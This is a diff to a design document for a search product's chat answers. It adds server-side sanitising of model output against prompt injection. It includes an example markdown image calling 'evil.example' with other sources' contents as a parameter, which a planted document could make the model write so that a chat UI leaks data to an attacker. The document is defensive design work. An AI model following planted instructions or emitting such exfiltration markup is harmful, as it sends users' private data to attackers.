@@ -47,6 +47,16 @@ what the best of the four products does:
   answer 256 KiB (past it the stream ends as `length` and the upstream is closed), one deadline
   for the whole answer, retrieval included. The search's response, the prompt (twice, for its
   JSON) and the answer are charged to the `request` breaker while the answer runs.
+- **Answers leave as text, whatever the model wrote** (`xpack/chat/answer.rs`). A planted
+  document can make the model end with `![.](https://evil.example/p?d=<other sources>)`, and chat
+  UIs on the OpenAI route (Open WebUI, LibreChat) render markdown, so the reader's browser would
+  send what they may read to the attacker. Every answer, JSON or streamed, native or OpenAI's, is
+  sanitized on the server: a link's or image's `](` becomes `]\(` and its URL a code span, a
+  line-start `[label]:` definition becomes `[label]\:`, a `<` starting a tag or autolink becomes
+  `\<`, and a bare URL becomes a code span. Nothing is removed, so the reader still sees the
+  text. While streaming, text that may still become one of these is held back until it settles,
+  at most 2 KiB. `allow_links: true` keeps inline links (never images) whose URL is exactly one in
+  the given sources' fields.
 - **The OpenAI route** drops a client's `system` and `developer` messages (chat UIs send their
   own): the profile's instructions are the only ones the model gets. `tools`, `functions`,
   `n` > 1, logprobs, `response_format` and non-text content are 400s; sampling settings are
@@ -345,8 +355,10 @@ in one call. So roll adds a route.
     `<`, `>` or copy of the boundary inside document text is escaped, so a document can't close its
     block or open another. The question follows the block in its own tag.
   - **History:** the turns, as the provider's message roles.
-- **The model has no tools.** It can't search, fetch or act, so an injected instruction can at
-  worst change the answer's text.
+- **The model has no tools.** It can't search, fetch or act. An injected instruction can still
+  steer the answer's text, including markup a renderer would load or link to send other sources
+  away, so answers are sanitized on the server ("Phase 2 as built"), not left to the frame's
+  request for plain text.
 - **Renderers treat answers as text.** The Playground, the snippet and the CLI never load an image
   or follow a link from an answer. Links to sources come from `sources[].fields`, not from the
   model's text. This closes the known exfiltration path, where a document makes the model write
